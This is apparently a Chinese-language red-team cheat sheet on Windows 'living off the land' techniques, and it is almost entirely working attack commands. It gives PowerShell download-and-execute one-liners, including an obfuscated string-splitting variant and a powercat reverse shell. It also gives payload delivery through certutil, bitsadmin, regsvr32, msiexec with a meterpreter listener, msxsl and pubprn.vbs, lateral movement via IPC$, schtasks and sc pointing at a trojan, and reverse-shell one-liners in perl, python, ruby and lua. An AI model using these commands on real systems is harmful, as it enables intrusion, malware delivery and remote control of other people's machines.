# Windows-LOL

`Living Off The Land`

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**相关文章**
- [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- [What Are LOLBins and How Do Attackers Use Them in Fileless Attacks? - Cynet](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/)
- [Windows文件下载执行的15种姿势](https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA)
- [命令行上线小技巧](https://blog.m1kh.com/index.php/archives/694/)

**相关资源**
- [LOLBAS](https://lolbas-project.github.io/)

---

# Powershell

## 开启执行策略

```powershell
set-ExecutionPolicy RemoteSigned
```

## 关闭执行策略

```powershell
set-ExecutionPolicy Restricted
```

## 远程下载文件保存在本地

```powershell
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1/evil.txt','evil.exe')

# 或

$h=new-object System.Net.WebClient
$h.DownloadFile('https://xxx.com/payload/shell/test.sh','C:\Users\xxx\Desktop\test\test.sh')
```

## 命令行执行 ps1 文件 (绕过本地权限执行)

```powershell
powershell.exe -ExecutionPolicy bypass -File "C:\Users\XX\Desktop\test\test.ps1"
```

ExecutionPolicy Bypass: 绕过执行安全策略，这个参数非常重要，在默认情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个参数，可以绕过任意一个安全保护规则。在渗透测试中，基本每次运行 PowerShell 脚本时都要使用这个参数。
* WindowStyle Hidden: 隐藏窗口。
* NoLogo: 启动不显示版权标志的 PowerShell.
* NonInteractive (-Nonl): 非交互模式，PowerShell 不为用户提供交互的提示。
* NoProfile (-NoP): PowerShell 控制台不加载当前用户的配置文件。
* Noexit: 执行后不退出 Shell。这在使用键盘记录等脚本时非常重要。

## 本地隐藏绕过权限执行脚本

```powershell
PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden NoLogo -NonInteractive -NoProfile File "test.ps1"
```

## 远程下载并执行

```powershell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1/1/evil.txt'))"
```

```powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.1.1/1/powercat.ps1'); powercat -c 192.168.1.1 -p 9999 -e cmd
```

**将命令拆分为字符串，然后进行拼接**
```powershell
powershell "$a='IEX(New-Object Net.WebClient).Downlo';$b='11(''https://xxx.com/payload/test/test.ps1'')'.Replace('11','adString');IEX ($a+$b)"
```

**用IEX下载远程PS1脚本绕过权限执行**
```powershell
PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString("test.ps1");[Parameters]
```

---

# 白名单

## smb

kali 使用 Impacket
```bash
mkdir smb && cd smb
impacket-smbserver share `pwd`
```

windows 命令行下拷贝
```
copy \\IP\share\file.exe file.exe
```

## Bitsadmin

bitsadmin 是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
```
bitsadmin /transfer n http://192.168.1.1/1/evil.txt d:\test\1.txt
```

## certutil

某些时候，服务器版本过低，无法使用 powershell，这时候可用 certutil 上线。

certutil 用于备份证书服务，支持 xp-win10 都支持。由于 certutil 下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。

缓存目录为: `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`

```bash
# 下载
certutil -urlcache -split -f http://192.168.1.1/evil.txt test.php

# bypass技巧
certutil & Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload.bin
certutil & Certutil -urlcache -split -f  https://xxx.com/test/mian.exe mian.exe & mian.exe
certutil | Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload1.bin

# 删除缓存
certutil -urlcache -split -f http://192.168.1.1/evil.txt delete
```

## ipc$

```
# 建立远程 IPC 连接
net use \\192.168.1.1\ipc$ /user:administrator "abc123!"

# 复制远程文件到本地主机
copy \\192.168.1.1\c$\2.txt D:\test
```

## MSBuild

- [Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)

## Mshta.exe

Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。

目标端
```
mshta.exe http://192.168.1.1/test.hta
```

这个基本上已经不好用了,杀软拦截的厉害

## Rundll32.exe

Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。

```cmd
rundll32.exe \\192.168.1.1\test.dll,0
```

## Regsvr32.exe

Regsvr32 是一个命令行实用程序，用于注册和注销 OLE 控件，例如 Windows 注册表中的 DLL 和 ActiveX 控件。Windows XP 和更高版本的 Windows 的 ％systemroot％\ System32 文件夹中安装了 Regsvr32.exe。

Regsvr32 使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载 / 执行）都可以在同一端口上发生。“PSH(Binary)” 将向磁盘写入文件，允许下载 / 执行自定义二进制文件。

```bash
regsvr32 /s /n /u /i:http://192.168.1.1/test.sct test.dll
```

## Msiexec.exe

msiexec 支持远程下载功能，将msi文件上传到服务器，通过如下命令远程执行：

攻击端
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=1234 -f msi > 1.msi

python -m SimpleHTTPServer 80

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.1
set lport 1234
exploit
```

目标端
```bash
msiexec /q /i http://192.168.1.1/1.msi
```

## msxsl.exe

msxsl.exe 是微软用于命令行下处理 XSL 的一个程序，所以通过他，我们可以执行 JavaScript 进而执行系统命令。

下载地址 : https://www.microsoft.com/en-us/download/details.aspx?id=21714

msxsl.exe 需要接受两个文件，XML 及 XSL 文件，可以远程加载
```bash
msxsl http://192.168.1.1/1/demo.xml http://192.168.1.1/1/exec.xsl
```

demo.xml
```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>
<customers>
<customer>
<name>Microsoft</name>
</customer>
</customers>
```

exec.xsl
```xml
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");
   return nodelist.nextNode().xml;

   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

## pubprn.vbs

在 Windows 7 以上版本存在一个名为 PubPrn.vbs 的微软已签名 WSH 脚本，其位于`C:\Windows\System32\Printing_Admin_Scripts\en-US`，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给 GetObject()

```bash
"C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
```

## conhost

```bash
conhost calc.exe
```

## schtasks

```bash
schtasks /create /tn foobar /tr c:\windows\temp\foobar.exe
/sc once /st 00:00 /S host /RU System schtasks /run /tn foobar /S host
schtasks /F /delete /tn foobar /S host                          # 清除 schtasks
```

## SC

```bash
sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    # 新建服务,指向拷贝的木马路径
sc \\host start foobar                                          # 启动建立的服务
sc \\host delete foobar                                         # 完事后删除服务
```

---

# Other

## perl

```perl
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## python

```powershell
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

## ruby

```ruby
ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## lua

```powershell
lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
